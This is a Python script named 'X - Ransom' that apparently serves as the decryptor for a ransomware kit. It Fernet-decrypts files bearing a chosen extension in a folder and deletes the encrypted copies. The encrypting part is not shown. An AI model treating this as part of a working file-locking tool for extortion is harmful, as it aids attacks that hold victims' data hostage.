#!/usr/bin/env python3
# Created By X - MrG3P5

import os
import pyfiglet
from colorama import Fore, init
from cryptography.fernet import Fernet
from os.path import isfile

# Color
green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.LIGHTYELLOW_EX

init(autoreset=True)

def banner(str):
    os.system("cls||clear")
    __banner__ = pyfiglet.figlet_format(str, font="slant", justify="center")
    print(red + __banner__)
    print(f"\t\t\t{red}[ {white}Created By X - MrG3P5 {red}]\n")

def decrypt_file(folder_path, key, extension_encrypted):
    fernet_key = Fernet(key)
    file_arr = []
    
    check_path = folder_path[-1]
    
    if check_path == "/":
        folder_path = folder_path
    else:
        folder_path = folder_path + "/"

    for file in os.listdir(folder_path):
        file = folder_path + file
        if isfile(file):
            if extension_encrypted in file:
                file_arr.append(file)
        else:
            continue

    if len(file_arr) == 0:
        exit(f"{red}[{yellow}!{red}] {white} No File Encrypted Found")
    else:
        for file_encrypted in file_arr:
            try:
                with open(file_encrypted, "rb") as f:
                    encrypted = f.read()

                decrypted = fernet_key.decrypt(encrypted)

                with open(file_encrypted.replace(extension_encrypted, ""), "wb") as fk:
                    fk.write(decrypted)

                if os.path.exists(file_encrypted):
                    os.remove(file_encrypted)
                    print(f"{red}[{green}*{red}] {white}Sukses Decrypted File {yellow}{file_encrypted}")
                else:
                    continue
            except:
                print(f"{red}[{red}!{red}] {white}Failed Decrypted File {yellow}{file_encrypted}")
        print(f"{red}[{green}*{red}]{white} Done Decrypted Files In Path {green}{folder_path}")

if __name__=="__main__":
    banner("X - Ransom")
    input_path = input(f"{red}[{white}?{red}] {white}Decrypt Path : ")
    custom_ext_input = input(f"{red}[{white}?{red}] {white}Custom Extension (ex: .hayuk) : ")
    input_key_file = input(f"{red}[{white}?{red}] {white}File Key : ")
    decrypt_file(input_path, str(open(input_key_file, "r").read()), custom_ext_input)
